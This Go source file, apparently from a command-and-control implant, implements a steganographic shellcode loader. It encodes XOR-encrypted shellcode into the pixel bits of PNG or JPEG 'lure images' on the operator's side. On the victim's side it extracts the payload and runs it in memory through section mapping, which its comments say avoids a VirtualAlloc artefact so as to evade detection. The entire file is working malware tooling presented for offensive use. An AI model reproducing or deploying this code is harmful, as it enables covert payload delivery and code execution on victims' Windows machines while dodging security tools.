//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"image/jpeg"
	"image/png"
	"os"
)

// Steganography shellcode loader.
//
// Shellcode is embedded in the LSB (least-significant bit) of pixel colour
// channels of a PNG or JPEG image.  The format:
//
//   Bytes 0-3  : uint32 big-endian — length of shellcode in bytes.
//   Bytes 4-N  : raw shellcode bytes (XOR-encrypted with a single-byte key).
//
// Each byte of payload occupies 8 consecutive pixel channel LSBs.
// Supports RGBA (PNG) and YCbCr (JPEG via image.NRGBA decode).
//
// Encoding is done offline (by a separate tool or the C2 operator console).
// This file implements only the *extraction* (decoder) side running on the agent.

// stegoExtract extracts the shellcode hidden in the LSBs of imagePath.
// key is the single-byte XOR key used during encoding (0 = no encryption).
func stegoExtract(imagePath string, key byte) ([]byte, error) {
	f, err := os.Open(imagePath)
	if err != nil {
		return nil, fmt.Errorf("stego: open %s: %w", imagePath, err)
	}
	defer f.Close()

	// Decode the image regardless of format (PNG or JPEG).
	img, _, err := image.Decode(f)
	if err != nil {
		return nil, fmt.Errorf("stego: decode image: %w", err)
	}

	bits := stegoExtractBits(img)
	if len(bits) < 32 {
		return nil, fmt.Errorf("stego: image too small to contain payload")
	}

	// First 32 bits → payload length.
	lenBytes := bitsToBytes(bits[:32])
	payloadLen := binary.BigEndian.Uint32(lenBytes)
	if payloadLen == 0 || uint64(payloadLen) > uint64(len(bits)/8)-4 {
		return nil, fmt.Errorf("stego: invalid payload length %d", payloadLen)
	}

	// Extract payload bytes.
	payloadBits := bits[32 : 32+payloadLen*8]
	payload := bitsToBytes(payloadBits)

	// XOR-decrypt if a key is provided.
	if key != 0 {
		for i := range payload {
			payload[i] ^= key
		}
	}
	return payload, nil
}

// stegoExtractBits extracts LSBs from every R, G, B, A channel of every pixel,
// in raster scan order (left-to-right, top-to-bottom).
func stegoExtractBits(img image.Image) []byte {
	bounds := img.Bounds()
	var bits []byte
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			r, g, b, a := img.At(x, y).RGBA()
			bits = append(bits,
				byte(r>>8)&1,
				byte(g>>8)&1,
				byte(b>>8)&1,
				byte(a>>8)&1,
			)
		}
	}
	return bits
}

// bitsToBytes packs a slice of 0/1 bit values into bytes (MSB first).
func bitsToBytes(bits []byte) []byte {
	out := make([]byte, len(bits)/8)
	for i := range out {
		for bit := 0; bit < 8; bit++ {
			if bits[i*8+bit] != 0 {
				out[i] |= 1 << (7 - uint(bit))
			}
		}
	}
	return out
}

// stegoExtractAndRun extracts shellcode from imagePath and executes it locally
// via NtCreateSection + NtMapViewOfSection (no VirtualAlloc artefact).
func stegoExtractAndRun(imagePath string, key byte) error {
	shellcode, err := stegoExtract(imagePath, key)
	if err != nil {
		return err
	}
	return mapInjectLocal(shellcode)
}

// ─── Encoding (operator utility, used by C2 server-side tooling) ─────────────

// stegoEncodePNG embeds shellcode into carrier PNG and writes to outPath.
// This is the *encoder* — run on the operator machine to prepare lure images.
func stegoEncodePNG(carrierPath, outPath string, shellcode []byte, key byte) error {
	f, err := os.Open(carrierPath)
	if err != nil {
		return fmt.Errorf("stego encode: open carrier: %w", err)
	}
	defer f.Close()

	img, err := png.Decode(f)
	if err != nil {
		return fmt.Errorf("stego encode: decode PNG: %w", err)
	}

	// XOR-encrypt shellcode.
	payload := make([]byte, len(shellcode))
	copy(payload, shellcode)
	if key != 0 {
		for i := range payload {
			payload[i] ^= key
		}
	}

	// Prepend 4-byte length header.
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(payload)))
	data := append(header, payload...)

	// Embed data in pixel LSBs.
	nrgba, ok := stegoCopyToNRGBA(img)
	if !ok {
		return fmt.Errorf("stego encode: unsupported image type for encoding")
	}
	if err := stegoEmbedBits(nrgba, data); err != nil {
		return err
	}

	out, err := os.Create(outPath)
	if err != nil {
		return fmt.Errorf("stego encode: create %s: %w", outPath, err)
	}
	defer out.Close()
	return png.Encode(out, nrgba)
}

// stegoEncodeJPEG embeds shellcode into a JPEG carrier.
// Note: JPEG is lossy — use quality=100 to prevent LSB corruption.
func stegoEncodeJPEG(carrierPath, outPath string, shellcode []byte, key byte, quality int) error {
	f, err := os.Open(carrierPath)
	if err != nil {
		return fmt.Errorf("stego encode JPEG: open carrier: %w", err)
	}
	defer f.Close()

	img, err := jpeg.Decode(f)
	if err != nil {
		return fmt.Errorf("stego encode JPEG: decode: %w", err)
	}

	payload := make([]byte, len(shellcode))
	copy(payload, shellcode)
	if key != 0 {
		for i := range payload {
			payload[i] ^= key
		}
	}
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(payload)))
	data := append(header, payload...)

	nrgba, ok := stegoCopyToNRGBA(img)
	if !ok {
		return fmt.Errorf("stego encode JPEG: unsupported image type")
	}
	if err := stegoEmbedBits(nrgba, data); err != nil {
		return err
	}

	out, err := os.Create(outPath)
	if err != nil {
		return fmt.Errorf("stego encode JPEG: create %s: %w", outPath, err)
	}
	defer out.Close()
	if quality <= 0 || quality > 100 {
		quality = 100
	}
	return jpeg.Encode(out, nrgba, &jpeg.Options{Quality: quality})
}

// stegoEmbedBits sets pixel channel LSBs to the bits of data (MSB first).
func stegoEmbedBits(img *image.NRGBA, data []byte) error {
	b := img.Bounds()
	totalPixelChannels := (b.Max.X - b.Min.X) * (b.Max.Y - b.Min.Y) * 4
	if totalPixelChannels < len(data)*8 {
		return fmt.Errorf("stego: carrier too small (%d channels, need %d bits)",
			totalPixelChannels, len(data)*8)
	}

	bitIdx := 0
	for y := b.Min.Y; y < b.Max.Y && bitIdx < len(data)*8; y++ {
		for x := b.Min.X; x < b.Max.X && bitIdx < len(data)*8; x++ {
			off := img.PixOffset(x, y)
			for ch := 0; ch < 4 && bitIdx < len(data)*8; ch++ {
				bytePos := bitIdx / 8
				bitPos := 7 - uint(bitIdx%8)
				bit := (data[bytePos] >> bitPos) & 1
				img.Pix[off+ch] = (img.Pix[off+ch] & 0xFE) | bit
				bitIdx++
			}
		}
	}
	return nil
}

// stegoCopyToNRGBA converts any image.Image to *image.NRGBA for pixel editing.
func stegoCopyToNRGBA(src image.Image) (*image.NRGBA, bool) {
	b := src.Bounds()
	dst := image.NewNRGBA(b)
	for y := b.Min.Y; y < b.Max.Y; y++ {
		for x := b.Min.X; x < b.Max.X; x++ {
			dst.Set(x, y, src.At(x, y))
		}
	}
	return dst, true
}
